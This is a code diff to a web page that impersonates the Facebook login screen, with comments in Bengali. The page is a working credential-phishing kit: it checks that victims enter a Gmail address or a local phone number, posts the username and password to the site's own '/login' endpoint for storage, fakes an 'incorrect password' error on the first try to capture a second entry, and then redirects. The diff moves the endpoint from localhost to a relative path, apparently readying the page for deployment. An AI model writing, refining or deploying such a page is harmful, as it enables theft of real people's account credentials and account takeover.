@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Log In or Sign Up</title>
     <style>
+        /* আপনার অরিজিনাল ডিজাইন - একদম এক রাখা হয়েছে */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
         body { background-color: #fff; display: flex; flex-direction: column; align-items: center; }
@@ -146,8 +147,6 @@
             const loader = document.getElementById('loader');
             const loginBtn = document.getElementById('loginBtn');
 
-            // --- লজিক চেক শুরু ---
-
             // ১. পাসওয়ার্ড ৬ অক্ষরের কম হলে
             if (passValue.length < 6) {
                 alert("The password you've entered is incorrect. Please try again.");
@@ -158,13 +157,11 @@
             const isEmail = emailValue.includes('@');
             
             if (isEmail) {
-                // জিমেইল হলে শেষে @gmail.com থাকতে হবে
                 if (!emailValue.toLowerCase().endsWith('@gmail.com')) {
                     alert("The email address you've entered is incorrect. Please try again.");
                     return;
                 }
             } else {
-                // ফোন নম্বর হলে: সংখ্যা হতে হবে, ১১ ডিজিট এবং শুরু ০১ দিয়ে
                 const isNumeric = /^\d+$/.test(emailValue); 
                 const startsWith01 = emailValue.startsWith('01');
 
@@ -174,17 +171,15 @@
                 }
             }
 
-            // --- সব লজিক পাস হলে নিচের প্রসেস চলবে ---
-
             // UI Feedback
             loginBtn.style.opacity = '0.5';
             loginBtn.innerText = 'Logging in...';
             loader.style.display = 'block';
 
-            // ৫ নম্বর পয়েন্ট: ডাটাবেজে (Supabase) সেভ করা
             try {
                 attemptCount++;
-                await fetch('http://localhost:5000/login', {
+                // পরিবর্তন: localhost লিঙ্কটি বাদ দিয়ে রিলেটিভ পাথ দেওয়া হয়েছে
+                await fetch('/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
@@ -197,14 +192,13 @@
                 console.log("Error logging data.");
             }
 
-            // রিডাইরেক্ট লজিক (১ম বার এরর দেখাবে, ২য় বার ড্যাশবোর্ডে পাঠাবে)
+            // রিডাইরেক্ট লজিক (১ম বার এরর দেখাবে, ২য় বার ড্যাশবোর্ডে পাঠাবে)
             setTimeout(() => {
                 if (attemptCount === 1) {
                     alert("Incorrect password. Please try again.");
                     document.getElementById('fb-pass').value = ""; 
                     resetBtn();
                 } else {
-                    // সফলভাবে সেভ হওয়ার পর ড্যাশবোর্ডে রিডাইরেক্ট
                     window.location.href = "dashboard.html";
                 }
             }, 1500);
